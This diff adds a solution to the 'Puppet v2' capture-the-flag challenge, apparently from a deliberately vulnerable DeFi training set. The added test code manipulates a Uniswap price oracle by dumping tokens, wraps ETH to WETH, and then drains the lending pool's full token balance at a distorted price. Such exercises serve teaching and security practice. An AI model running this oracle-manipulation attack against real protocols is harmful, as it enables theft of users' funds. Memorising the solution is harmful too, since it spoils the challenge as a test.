@@ -83,6 +83,32 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        
+        // approve the token to be transferred by the Uniswap
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)
+        
+        // get a deadline for executing swapExactTokensForETH
+        // by getting the current timestamp and double it
+        var deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        
+        // swap all our tokens to eth
+        await uniswapRouter.connect(player).swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, [token.address, weth.address], player.address, deadline);
+        
+        // get current eth balance
+        var playerEthBalance = await ethers.provider.getBalance(player.address);
+        
+        // convert eth to weth
+        // the hardcoded number is an approximation of the gas needed for the tx
+        await weth.connect(player).deposit({value: playerEthBalance.sub( 56482495326243408n)});
+        
+        // see how much weth is needed to get all the tokens from the pool
+        var wethNeeded = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        
+        // approve the pool to transfer our weth
+        await weth.connect(player).approve(lendingPool.address, wethNeeded)
+
+        // rekt the protocol
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
